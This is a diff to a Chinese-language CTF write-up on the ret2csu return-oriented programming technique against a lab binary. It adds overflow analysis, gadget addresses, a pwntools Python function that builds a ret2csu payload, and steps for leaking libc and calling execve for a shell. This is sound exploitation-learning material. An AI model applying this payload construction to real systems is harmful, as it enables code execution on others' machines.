@@ -2,11 +2,11 @@
 选择中级 ROP 里的 ret2csu 。
 
 * 思路
-主要利用的是 lic 里的 lic_csu_init 函数，这个函数是用来初始化 lic 的，并且方便反弹 shell 的 system 和 execve 等函数都在 libc 里，且大部分应用程序都会调用 libc 里的函数。
+主要利用的是 libc 里的 libc_csu_init 函数，这个函数是用来初始化 libc 的，并且方便反弹 shell 的 system 和 execve 等函数都在 libc 里，且大部分应用程序都会调用 libc 里的函数。
 
 所以最基本的思路就是通过 target 里调用的 libc 函数来定位到 libc 里其他函数的地址，比如 execve ，之后再构造需要反弹的 shell 之类的参数，通过栈移出到 ret_addr 那里来执行。
 
-* 实现
+* 设计
 
 ** __libc_csu_init 函数的利用
 查阅资料得知，该函数有一段代码可以设置 x86_64 中三个用于传递参数的寄存器 rsi rdx 和  rdi ，在 level5 这个 elf 文件中，该代码片段如下：
@@ -19,6 +19,104 @@
 0x00400611      4839eb         cmp rbx, rbp      ; 比较rbx和rbp，检查是否已经遍历了整个数组
 0x00400614      75ea           jne 0x400600      ; 如果rbx < rbp，意味着还没调用完所有函数，跳回0x400600继续循环
 #+END_SRC
+
+** payload 构造基本思路
+
+查看 vulnerable 函数如下，其中缓冲区大小为128，但是 read 的参数为0x200, 是512，明显比分配的缓冲区要大，所以通过向这个 read 函数输入构造的 payload 来实现攻击。
+
+#+BEGIN_IMAGE
+[[file:writeup/20231104_133920.png]]
+#+END_IMAGE
+
+通过查看汇编代码，发现缓冲区地址为 ~rbp-0x80~ 。
+
+#+BEGIN_IMAGE
+[[file:writeup/20231104_135704.png]]
+#+END_IMAGE
+
+因此 payload 的构造需要先填充这128和 rdp 的位置 ~p64(0x00*136)~ 。
+
+之后，查看 __libc_csu_init 中可以利用的 gadget 为 0x0040061a ，于是 payload 的下一步为 ~p64(0x0040061a)~
+
+#+BEGIN_IMAGE
+[[file:writeup/20231104_152237.png]]
+#+END_IMAGE
+
+之后就是填充栈的地址，完成 rbx rbp ret 关键数据的填充。
+
+再之后就是需要 ret 的地址，开始执行代码，这里是 ret 到 ~call qword [r12 + rbx*8]~ 这一行进行 call 操作。
+
+call 操作完成后，ret 会返回到原来的指令，如下：
+
+#+BEGIN_IMAGE
+[[file:writeup/20231104_161424.png]]
+#+END_IMAGE
+
+算上 ret 共弹出了 7*8 个字节，所以需要一个 56 字节的填充数据。
+
+最后返回 main 函数方便下一步操作。
+
+所以一个 libc_csu_init 的利用函数如下 (GPT 辅助生成的):
+
+#+BEGIN_SRC python
+  def craft_ret2csu_payload(buf_size, csu_gadget_addr, func_gadget_addr, func_to_call, rdi, rsi, rdx, rbx=0, rbp=0, r12=0, r13=0, r14=0, r15=0, extra_padding=b'', next_func_addr=None):
+      """
+      Craft a ret2csu payload to control the registers and call a function.
+
+      :param buf_size: The size of the buffer before the return address.
+      :param csu_gadget_addr: The address of the csu gadget.
+      :param func_gadget_addr: The address of the function call gadget.
+      :param func_to_call: The function to call, usually GOT entry of a function.
+      :param rdi: The value to set in RDI before the function call.
+      :param rsi: The value to set in RSI before the function call.
+      :param rdx: The value to set in RDX before the function call.
+      :param rbx: The value to set in RBX, if needed for the csu gadget.
+      :param rbp: The value to set in RBP, if needed for the csu gadget.
+      :param r12: The value to set in R12, which should be the function to call minus the offset.
+      :param r13: The value to set in R13 (RDI).
+      :param r14: The value to set in R14 (RSI).
+      :param r15: The value to set in R15 (RDX).
+      :param extra_padding: Any extra padding if needed after the csu gadgets.
+      :param next_func_addr: The address to return to after the function call (e.g., main).
+      :return: The constructed payload.
+      """
+      from pwn import p64
+
+      # Create padding to reach the return address
+      payload = b"A" * buf_size
+
+      # Add the csu_gadget_addr
+      payload += p64(csu_gadget_addr)
+
+      # Setup values for the CSU gadget
+      # It's important to note that the actual registers are not yet set. This is simply putting values on the stack
+      # that will be popped into registers by the CSU gadget.
+      payload += p64(rbx)
+      payload += p64(rbp)
+      payload += p64(r12) # This will be the location to call, plus the appropriate offset
+      payload += p64(r13) # Becomes RDI
+      payload += p64(r14) # Becomes RSI
+      payload += p64(r15) # Becomes RDX
+
+      # Add the func_gadget_addr which will call the function [r12+rbx*8]
+      payload += p64(func_gadget_addr)
+
+      # Add extra padding if necessary to align the stack correctly
+      payload += extra_padding
+
+      # Finally, add the address of the function to call if necessary
+      if next_func_addr:
+          payload += p64(next_func_addr)
+
+      return payload
+
+#+END_SRC
+
+询问 GPT 得到以下的栈布局结构：
+
+#+BEGIN_IMAGE
+[[file:writeup/20231104_132341.png]]
+#+END_IMAGE
 
 ** 获取 libc.so 的版本
 获取 libc 版本前需要先分清楚一个函数的真实地址和其在 libc.so 中的地址的区别。
@@ -39,6 +137,21 @@
 #+END_IMAGE
 
 于是可以通过这两个函数的地址来确定 libc 的版本等信息。
+
+
+* 流程
+
+基本流程如下：
+
+1. 第一次利用 csu ，获取 write 相对 GTO 的地址偏移量，确定 libc 的版本，从而获取 execve 的地址偏移量。
+2. 写入 .bss 段。
+3. 最后一次利用 csu ，执行 execve 反弹 shell ，完成 ROP 利用。
+
+* tip
+
+不能把静态调试的指令地址和实际执行的数据地址弄混，栈之类的数据都是运行时在内存里随机分配的，没法直接操作，并且向 r12 rbx 这种寄存器也是通过溢出所操作不了的，而 __libc_csu_init 能利用的原因就是因为上文提到的 gadget ，他从栈里弹数据写道寄存器里，这就给了我们操作的空间。
+
+ret 指令：在 x64 机器中，弹出8个字节的数据，并作为地址返回开始执行上面的指令许列，这里的重点也是从栈上弹出地址，操作栈就可以劫持控制流。
 
 * 工具
 - radare2
